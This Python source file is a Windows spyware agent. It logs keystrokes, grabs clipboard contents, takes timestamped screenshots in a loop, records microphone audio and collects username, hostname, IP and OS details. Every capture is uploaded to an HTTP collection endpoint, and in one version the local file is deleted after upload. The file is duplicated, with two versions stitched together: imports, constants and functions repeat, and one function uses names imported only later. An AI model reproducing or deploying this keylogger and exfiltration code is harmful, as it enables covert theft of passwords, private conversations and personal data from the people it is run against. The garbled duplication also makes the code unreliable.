import os
import time
import threading
import platform
import socket
import getpass
import requests
from pynput import keyboard
from pynput.keyboard import Key
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
import win32clipboard
from datetime import datetime

UPLOAD_URL = "http://127.0.0.1:5000/upload"
FILE_PATH = os.path.join(os.getcwd(), "agent_temp")
os.makedirs(FILE_PATH, exist_ok=True)

KEY_LOG = os.path.join(FILE_PATH, "key_log.txt")
CLIPBOARD_LOG = os.path.join(FILE_PATH, "clipboard.txt")
SCREENSHOT_FILE = os.path.join(FILE_PATH, "screenshot.png")
AUDIO_FILE = os.path.join(FILE_PATH, "audio.wav")
SYSTEM_INFO_FILE = os.path.join(FILE_PATH, "systeminfo.txt")
MIC_DURATION = 10  # seconds

def send_file(filepath):
    if os.path.exists(filepath):
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            try:
                r = requests.post(UPLOAD_URL, files=files)
                print(f"Uploaded {filepath}: {r.status_code}")
                if r.status_code == 200:
                    # Delete file after successful upload
                    os.remove(filepath)
                    print(f"Deleted {filepath} after upload.")
            except Exception as e:
                print(f"Failed to upload {filepath}: {e}")
    else:
        print(f"{filepath} not found for upload.")

# ------------------- Keylogger -------------------
def keylogger():
    keys = []
    def write_keys():
        if keys:
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
            with open(KEY_LOG, "a", encoding="utf-8") as f:
                f.write(f"{timestamp}   {''.join(keys)}\n")
            keys.clear()

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                keys.append(key.char)
            elif key == keyboard.Key.space:
                keys.append(' ')
            elif key == keyboard.Key.enter:
                keys.append('\n')
            else:
                keys.append(f'[{key.name}]')
        except:
            keys.append('[UNKNOWN]')

        if len(keys) >= 10:
            write_keys()

    def on_release(key):
        if key == keyboard.Key.esc:
            write_keys()
            send_file(KEY_LOG)
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ------------------- Clipboard -------------------
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
    except:
        data = "Clipboard access failed"
    with open(CLIPBOARD_LOG, "w", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n{data}\n")
    send_file(CLIPBOARD_LOG)

# ------------------- Screenshot -------------------
def screenshot():
    try:
        # Capture screenshot
        im = ImageGrab.grab()

        # Add timestamp overlay
        draw = ImageDraw.Draw(im)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Load a font (fallback to default if not found)
        try:
            font = ImageFont.truetype("arial.ttf", 20)
        except IOError:
            font = ImageFont.load_default()

        # Draw timestamp text on bottom-left corner
        text_position = (10, im.height - 30)
        draw.text((text_position[0]-1, text_position[1]-1), timestamp, font=font, fill="black")
        draw.text((text_position[0]+1, text_position[1]-1), timestamp, font=font, fill="black")
        draw.text((text_position[0]-1, text_position[1]+1), timestamp, font=font, fill="black")
        draw.text((text_position[0]+1, text_position[1]+1), timestamp, font=font, fill="black")
        draw.text(text_position, timestamp, font=font, fill="white")

        # Save screenshot with timestamp in filename
        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot_path = os.path.join(FILE_PATH, filename)
        im.save(screenshot_path)

        # Upload the screenshot
        send_file(screenshot_path)

        # Optionally delete after upload (already done in send_file)
        # os.remove(screenshot_path)

    except Exception as e:
        print(f"Screenshot failed: {e}")

# ------------------- Audio -------------------
def record_audio():
    try:
        fs = 44100
        recording = sd.rec(int(MIC_DURATION * fs), samplerate=fs, channels=2)
        sd.wait()
        write(AUDIO_FILE, fs, recording)
        send_file(AUDIO_FILE)
    except Exception as e:
        print(f"Audio recording failed: {e}")

# ------------------- Runner -------------------
import os
import time
import platform
import socket
import getpass
import threading
import requests
from pynput import keyboard
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageDraw, ImageFont
import win32clipboard
from datetime import datetime

UPLOAD_URL = "http://127.0.0.1:5000/upload"
FILE_PATH = os.path.join(os.getcwd(), "agent_temp")
os.makedirs(FILE_PATH, exist_ok=True)

KEY_LOG = os.path.join(FILE_PATH, "key_log.txt")
CLIPBOARD_LOG = os.path.join(FILE_PATH, "clipboard.txt")
SCREENSHOT_FILE = os.path.join(FILE_PATH, "screenshot.png")
AUDIO_FILE = os.path.join(FILE_PATH, "audio.wav")
SYSTEM_INFO_FILE = os.path.join(FILE_PATH, "system_info.txt")
MIC_DURATION = 10  # seconds


def send_file(filepath):
    if os.path.exists(filepath):
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f)}
            try:
                r = requests.post(UPLOAD_URL, files=files)
                print(f"Uploaded {filepath}: {r.status_code}")
            except Exception as e:
                print(f"Failed to upload {filepath}: {e}")
    else:
        print(f"{filepath} not found for upload.")

# ------------------- Keylogger -------------------
def keylogger():
    keys = []
    def write_keys():
        if keys:
            timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
            with open(KEY_LOG, "a", encoding="utf-8") as f:
                f.write(f"{timestamp}   {''.join(keys)}\n")
            keys.clear()

    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                keys.append(key.char)
            elif key == keyboard.Key.space:
                keys.append(' ')
            elif key == keyboard.Key.enter:
                keys.append('\n')
            else:
                keys.append(f'[{key.name}]')
        except:
            keys.append('[UNKNOWN]')

        if len(keys) >= 10:
            write_keys()

    def on_release(key):
        if key == keyboard.Key.esc:
            write_keys()
            send_file(KEY_LOG)
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# ------------------- Clipboard -------------------
def copy_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
    except:
        data = "Clipboard access failed"
    with open(CLIPBOARD_LOG, "w", encoding="utf-8") as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n{data}\n")
    send_file(CLIPBOARD_LOG)

# ------------------- Screenshot -------------------
def screenshot():
    try:
        im = ImageGrab.grab()
        im.save(SCREENSHOT_FILE)
        send_file(SCREENSHOT_FILE)
    except Exception as e:
        print(f"Screenshot failed: {e}")

from PIL import ImageDraw, ImageFont

#------------------- Screenshot loop function -------------------
def screenshot_loop(interval=600):
    while True:
        try:
            # Capture screenshot
            im = ImageGrab.grab()

            # Add timestamp overlay
            draw = ImageDraw.Draw(im)
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Load a font (default to a basic PIL font if no TTF available)
            try:
                font = ImageFont.truetype("arial.ttf", 20)
            except IOError:
                font = ImageFont.load_default()

            # Text position (bottom-left corner)
            text_position = (10, im.height - 30)
            # Draw text with black outline for better visibility
            draw.text((text_position[0]-1, text_position[1]-1), timestamp, font=font, fill="black")
            draw.text((text_position[0]+1, text_position[1]-1), timestamp, font=font, fill="black")
            draw.text((text_position[0]-1, text_position[1]+1), timestamp, font=font, fill="black")
            draw.text((text_position[0]+1, text_position[1]+1), timestamp, font=font, fill="black")
            draw.text(text_position, timestamp, font=font, fill="white")

            # Save screenshot with timestamp in filename
            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            screenshot_path = os.path.join(FILE_PATH, filename)
            im.save(screenshot_path)

            # Upload the screenshot
            send_file(screenshot_path)
        except Exception as e:
            print(f"Screenshot failed: {e}")

        time.sleep(interval)

# ------------------- Audio -------------------
def record_audio():
    try:
        fs = 44100
        recording = sd.rec(int(MIC_DURATION * fs), samplerate=fs, channels=2)
        sd.wait()
        write(AUDIO_FILE, fs, recording)
        send_file(AUDIO_FILE)
    except Exception as e:
        print(f"Audio recording failed: {e}")

# ------------------- systeminfo -------------------
def capture_system_info():
    try:
        info = {
            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "Username": getpass.getuser(),
            "Hostname": socket.gethostname(),
            "IP Address": socket.gethostbyname(socket.gethostname()),
            "OS": platform.system(),
            "OS Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor()
        }

        with open(SYSTEM_INFO_FILE, "w", encoding="utf-8") as f:
            for key, value in info.items():
                f.write(f"{key}: {value}\n")

        send_file(SYSTEM_INFO_FILE)

    except Exception as e:
        print(f"System info capture failed: {e}")

# ------------------- Runner -------------------
def run_all():
    threading.Thread(target=keylogger).start()
    time.sleep(3)

    threading.Thread(target=copy_clipboard).start()
    threading.Thread(target=screenshot).start()
    threading.Thread(target=record_audio).start()
    threading.Thread(target=capture_system_info).start()

if __name__ == "__main__":
    run_all()
